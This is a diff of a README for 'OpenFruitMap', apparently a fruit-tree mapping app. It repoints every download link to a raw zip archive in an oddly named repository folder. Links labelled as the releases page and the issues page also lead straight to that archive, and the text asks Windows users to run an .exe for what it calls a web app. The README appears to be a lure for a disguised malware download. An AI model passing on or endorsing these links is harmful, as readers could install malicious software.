@@ -1,6 +1,6 @@
 # 🍏 OpenFruitMap - Discover Nature with Ease
 
-[![Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip%https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip)](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip)
+[![Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip%https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip)](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip)
 
 OpenFruitMap is an easy-to-use web application that helps you explore fruit trees around the world. With its intuitive interface, you can quickly find and enjoy the benefits of nature.
 
@@ -10,7 +10,7 @@ To get started with OpenFruitMap, follow these simple steps. You’ll be up and 
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
    
-   [Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip)
+   [Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip)
 
 2. **Choose Your Version:** Look for the latest release on the page. Each version comes with improvements and new features.
 
@@ -26,7 +26,7 @@ Before installing, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip).
 
 2. **Install OpenFruitMap:**
    - For **Windows** users: Download the `.exe` file and double-click it to start the installation. Follow the on-screen prompts.
@@ -60,7 +60,7 @@ If you encounter any issues, here are common solutions:
 
 If you need assistance, feel free to reach out through the following channels:
 
-- **GitHub Issues:** Report bugs or request features by creating an issue on our [GitHub page](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip).
+- **GitHub Issues:** Report bugs or request features by creating an issue on our [GitHub page](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip).
 - **Community Forum:** Join discussions and ask for help on our community forum linked in the documentation.
 
 ## 📚 Frequently Asked Questions
@@ -78,4 +78,4 @@ A: We regularly release updates to improve functionality and add new features.
 
 With OpenFruitMap, you can easily discover and share information about fruit trees worldwide. Follow the steps above to download and install the application. Enjoy exploring nature! 
 
-[Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/OpenFruitMap.zip)
+[Download OpenFruitMap](https://raw.githubusercontent.com/marinfreyder/OpenFruitMap/main/savingness/Fruit-Map-Open-v1.8.zip)
